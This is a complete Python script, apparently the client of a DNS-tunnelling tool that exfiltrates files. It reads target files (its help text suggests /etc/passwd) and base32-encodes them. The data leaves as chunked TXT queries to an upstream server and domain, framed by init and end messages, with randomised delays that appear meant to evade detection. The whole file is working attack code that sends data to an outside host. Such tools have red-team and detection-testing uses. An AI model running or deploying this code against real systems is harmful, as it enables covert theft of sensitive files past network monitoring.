#!/usr/bin/env python3.12

import os
import sys
import uuid
import json
import argparse
import dnslib
import signal
import threading
import time
import random
import tempfile
import base64
import socket
from utils import *

MIN_TIME_SLEEP = None
MAX_TIME_SLEEP = None
MIN_BYTES_READ = None
MAX_BYTES_READ = None

class FileExfiltrator(threading.Thread):
    def __init__(self,file_to_send, args):
        threading.Thread.__init__(self)
        self.file_to_send = file_to_send
        self.domain = args.domain
        self.address, self.port = args.socket.split(':')
        self.sessionid = str(uuid.uuid4())[:8].upper()
        self.total_chunks = None
        self.checksum = ''
        self.max_attempts = 5

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(2)

    def divide_in_labels(self, data_chunk):
        # Divide data into labels of up to 63 characters
        labels = [data_chunk[i:i + 63] for i in range(0, len(data_chunk), 63)]
        return labels

    def run(self):

        try:
            # Verify if the file exists
            if not os.path.exists(self.file_to_send):
                raise FileNotFoundError(f"Error: File {self.file_to_send} not found.")

            # Verify if the file is empty
            # For info: if file empty, mad5 hash is d41d8cd98f00b204e9800998ecf8427e
            if os.path.getsize(self.file_to_send) == 0:
                raise ValueError(f"Error: File {self.file_to_send} is empty.")

            # If the file exists and is not empty, compute the MD5 hash
            with open(self.file_to_send, 'rb') as f:
                self.checksum = md5(f)
                print(f"MD5 Hash: {self.checksum}")

                f.seek(0)

                file_data = f.read()
                encoded_file_data = encode_base32(file_data)
                #print(f"File content encoded in base32 : {encoded_file_data}")

        except FileNotFoundError as e:
            print(e)
            sys.exit(1)
        except ValueError as e:
            print(e)
            sys.exit(1)
        except Exception as e:
            print(f"Error: {e}")
            sys.exit(1)

        temp_file = tempfile.SpooledTemporaryFile()
    
        temp_file.write(encoded_file_data.encode('utf-8'))
        temp_file.seek(0) # Return to beginning of temporary file
        
        file_size = len(temp_file.read())
        temp_file.seek(0)

        # Compute the total number of chunks to be sent by dividing the file size by the number of data items sent per request. 
        # We add 126 to ensure that the last chunk, which might be smaller than 126 bytes, is taken into account.
        #self.total_chunks = (file_size + 126 - 1) // 126
        #print(self.total_chunks)


        # Send the initialization request
        #data = ['init',str(os.path.basename(self.file_to_send)),str(self.total_chunks),str(self.checksum)]
        data = ['init',str(os.path.basename(self.file_to_send)),str(self.checksum)]
        qname = f"{self.sessionid}"
        for element in data:
            # Convertir la chaîne en une séquence d'octets (UTF-8 est couramment utilisé)
            binary_data = element.encode('utf-8')
            # Encoder en base32
            encoded_element = base64.b32encode(binary_data).decode('utf-8').rstrip('=')
            qname += '.' + encoded_element
        qname = qname + '.' + str(self.domain)   
        print(qname)

        query = dnslib.DNSRecord.question(qname, "TXT")

        #q.send(self.address, int(self.port), timeout=1)
        self.sock.sendto(query.pack(), (self.address, int(self.port)))

        try:
            response, _ = self.sock.recvfrom(1024)

        except socket.timeout:
            print("Timeout: No response received within the specified timeout.")
            print("Server unreachable")
            self.sock.close()
            sys.exit(0)

        reply = dnslib.DNSRecord.parse(response)
        #print(f"Received DNS response: {reply}")

        # Check if the response domain is equal to the request
        if reply.rr:
            # Parcourez chaque enregistrement de réponse
            for rr in reply.rr:
                if str(rr.rdata).replace("\"", "") == "init":
                    print("Connection initialized")
                else:
                    print("Wrong initialization response")
        else:
            print("The response does not contain any response records.")
            print("Wrong initialization response")
            sys.exit(0)
            

        
        # Start sending file
        chunk_index = 0
        while True:
            # Pattern: [sessionID].[chunk_index]. [...] .[domain]
            fixed_parts_size = len(self.sessionid) + len(str(chunk_index)) + len(self.domain) + 3

            remaining_size = 253 - fixed_parts_size
            #print(remaining_size)
            points = (remaining_size-1) // 63
            #print(points)

            data_chunk = temp_file.read(remaining_size - points).decode('utf-8')
            if not data_chunk:
                break

            #if len(data_chunk) <= 63:
            #    qname = f"{self.sessionid}.{chunk_index}.{str(data_chunk)}.{self.domain}"
            #else:
            #    qname = f"{self.sessionid}.{chunk_index}.{str(data_chunk[:63])}.{str(data_chunk[63:])}.{self.domain}"

            labels = self.divide_in_labels(data_chunk)
            qname = f"{self.sessionid}.{chunk_index}." + ".".join(labels) + f".{self.domain}"
            
            #print(qname)

            query = dnslib.DNSRecord.question(qname, "TXT")
            self.sock.sendto(query.pack(), (self.address, int(self.port)))

            #print(data)

            try:
                response, _ = self.sock.recvfrom(1024)

            except socket.timeout:
                print("Timeout: No response received within the specified timeout.")
                print("Server failure")
                self.sock.close()
                sys.exit(0)

            reply = dnslib.DNSRecord.parse(response)

            if reply.rr:
                # Browse each answer record
                for rr in reply.rr:
                    if str(rr.rdata).replace("\"", "") == str(chunk_index):
                        print("Packet received")
                    else:
                        print("Wrong packet response")
            else:
                print("The response does not contain any response records.")
                print("Wrong initialization response")
                sys.exit(0)
        

            time_to_sleep = random.uniform(MIN_TIME_SLEEP, MAX_TIME_SLEEP)
            print(f"Sleeping for {time_to_sleep} seconds")
            time.sleep(time_to_sleep)
            chunk_index = chunk_index + 1

        # Send end request
        data = ['end']
        qname = f"{self.sessionid}.{chunk_index}"
        for element in data:
            # Convertir la chaîne en une séquence d'octets (UTF-8 est couramment utilisé)
            binary_data = element.encode('utf-8')
            # Encoder en base32
            encoded_element = base64.b32encode(binary_data).decode('utf-8').rstrip('=')
            qname += '.' + encoded_element
        qname = qname + '.' + str(self.domain)
        print(qname)

        query = dnslib.DNSRecord.question(qname, "TXT")

        #q.send(self.address, int(self.port), timeout=1)
        self.sock.sendto(query.pack(), (self.address, int(self.port)))

        try:
            response, _ = self.sock.recvfrom(1024)

        except socket.timeout:
            print("Timeout: No response received within the specified timeout.")
            print("Server unreachable")
            self.sock.close()
            sys.exit("Exiting due to timeout.")

        reply = dnslib.DNSRecord.parse(response)

        if reply.rr:
            # Browse each answer record
            if reply.questions[0].qname == dnslib.DNSLabel(qname) and reply.header.rcode != dnslib.RCODE.SERVFAIL:
                for rr in reply.rr:
                    if str(rr.rdata).replace("\"", "") == "done":
                        print("Transfer completed")
                    else:
                        print("Failed to finish transfer")
        else:
            print("The response does not contain any response records.")
            print("Wrong initialization response")
            sys.exit(0)

        #while True:
            #print("Thread for file {} is running...".format(self.file_to_send))
            #time.sleep(1)  # Simulate a long task

        temp_file.close()
        sys.exit(0)


def signal_handler(sig, frame):
    print("Received signal {}, exiting...".format(sig))
    sys.exit(0)

def main():
    global MIN_TIME_SLEEP, MAX_TIME_SLEEP, MIN_BYTES_READ, MAX_BYTES_READ

    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--socket', action="store", dest="socket", default=None,
                        help="The upstream server for making DNS requests and the port (eg. '-s 127.0.0.1:53')")
    parser.add_argument('-f','--file', nargs="+", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', '--domain', action="store", dest="domain",
                        help="The domain to make requests for. (eg. '-d test.com')")
    args = parser.parse_args()


    # Afficher les valeurs des arguments
    print('Socket:', args.socket)
    print('Files:', args.file)
    print('Domains:', args.domain, '\n')

    with open('config.json') as json_file:
        config = json.load(json_file)

    MIN_TIME_SLEEP = int(config['minTimeSleep'])
    MAX_TIME_SLEEP = int(config['maxTimeSleep'])
    MIN_BYTES_READ = int(config['minBytesRead'])
    MAX_BYTES_READ = int(config['maxBytesRead'])

    signal.signal(signal.SIGINT, signal_handler)

    if (args.file is None):
        parser.print_help()
        sys.exit(-1)

    else:
        files = list(set(args.file))
        #print(files)

    threads = []
    for file_to_send in files:
        print(f"Launching thread for file {file_to_send}")
        thread = FileExfiltrator(file_to_send, args)
        threads.append(thread)
        thread.daemon = True
        thread.start()

    # Join for the threads
    for thread in threads:
        while True:
            thread.join(1)
            if not thread.is_alive():
                break

if __name__ == '__main__':
    main()